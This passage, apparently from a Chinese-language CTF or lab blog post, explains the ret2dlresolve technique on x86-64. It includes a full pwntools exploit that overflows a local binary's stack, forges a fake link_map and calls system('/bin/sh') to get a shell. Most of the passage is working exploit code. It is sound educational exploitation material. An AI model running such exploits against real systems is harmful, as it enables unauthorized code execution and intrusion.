    Elf64_Xword     st_size;      /* Symbol size */
} Elf64_Sym;
// 24字节 = 4+1+1+2+8+8
```

把一个函数的 got-0x8 的位置设置为 sym 表首地址，则它的 `st_value` 就是这个 got 上的值，且 `st_other` 的值恰好不为 0。

![image-20221104210238038](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221104210238038.png)

```python
    linkmap += p64(0x6)                             # 0x30 DT_SYMTAB
    linkmap += p64(known_func_plt - 0x8)
```

综上，`fake_link_map` 伪造 payload 如下：

```python
def fake_linkmap_payload(fake_linkmap_addr, known_func_plt, offset):
    # 0x00 DT_STRTAB
    linkmap  = p64(offset & (2**64-1))              # 0x00 l_addr

    linkmap += p64(0x17)                            # 0x08 DT_JMPREL
    linkmap += p64(fake_linkmap_addr + 0x18)        # 0x10 fake_rela
    
    # 0x18
    linkmap += p64((fake_linkmap_addr - offset) & (2**64-1))   # Rela -> r_offset
    linkmap += p64(0x7)                             # Rela -> r_info
    linkmap += p64(0)                               # Rela -> r_append

    linkmap += p64(0x6)                             # 0x30 DT_SYMTAB
    linkmap += p64(known_func_plt - 0x8)

    linkmap += b'/bin/sh\x00'                       # 0x40
    linkmap  = linkmap.ljust(0x68, b'A')
    linkmap += p64(fake_linkmap_addr)               # 0x68 DT_STRTAB_addr
    linkmap += p64(fake_linkmap_addr + 0x30)        # 0x70 DT_SYMTAB_addr
    linkmap  = linkmap.ljust(0xf8, b'A')
    linkmap += p64(fake_linkmap_addr + 0x8)         # 0xf8 DT_JMPREL_addr
    return linkmap

fake_link_map = fake_linkmap_payload(base_stage, write_got, l_addr)
```



完整 exp：

第一次 read 时布置好栈空间，准备第二次向 bss 段读入 fake_link_map 并返回 dl-resolve。

```python
#!/bin/python3
from pwn import *

elf = ELF('./bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 0x70+8
read_plt = elf.plt['read']

bss_addr = 0x601050
base_stage = bss_addr + 0x100

pop_rdi_ret = 0x4007a3
pop_rsi_r15_ret = 0x4007a1
plt_load = 0x400506  # jmp got[2]

p = process('./bof')
p.recvuntil('\n')
payload  = b'a'*offset
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(base_stage)
payload += p64(0)
payload += p64(read_plt)            # read(0, base_stage, 0x100)
payload += p64(pop_rsi_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(base_stage+0x40)     # cmd_addr
payload += p64(plt_load)            # jmp dl_resolve (got[2])
payload += p64(base_stage)          # 已经 push 的 link_map (got[1])
payload += p64(0)                   # 已经 push 的 n

p.sendline(payload)

write_got = elf.got['write']
l_addr = libc.sym['system'] - libc.sym['write']

def fake_linkmap_payload(fake_linkmap_addr, known_func_plt, offset):
    # 0x00 DT_STRTAB
    linkmap  = p64(offset & (2**64-1))              # 0x00 l_addr

    linkmap += p64(0x17)                            # 0x08 DT_JMPREL
    linkmap += p64(fake_linkmap_addr + 0x18)        # 0x10 fake_rela
    
    # 0x18
    linkmap += p64((fake_linkmap_addr - offset) & (2**64-1))   # Rela -> r_offset
    linkmap += p64(0x7)                             # Rela -> r_info
    linkmap += p64(0)                               # Rela -> r_append

    linkmap += p64(0x6)                             # 0x30 DT_SYMTAB
    linkmap += p64(known_func_plt - 0x8)

    linkmap += b'/bin/sh\x00'                       # 0x40
    linkmap  = linkmap.ljust(0x68, b'A')
    linkmap += p64(fake_linkmap_addr)               # 0x68 DT_STRTAB_addr
    linkmap += p64(fake_linkmap_addr + 0x30)        # 0x70 DT_SYMTAB_addr
    linkmap  = linkmap.ljust(0xf8, b'A')
    linkmap += p64(fake_linkmap_addr + 0x8)         # 0xf8 DT_JMPREL_addr
    return linkmap

fake_link_map = fake_linkmap_payload(base_stage, write_got, l_addr)

p.sendline(fake_link_map)
p.interactive()
```



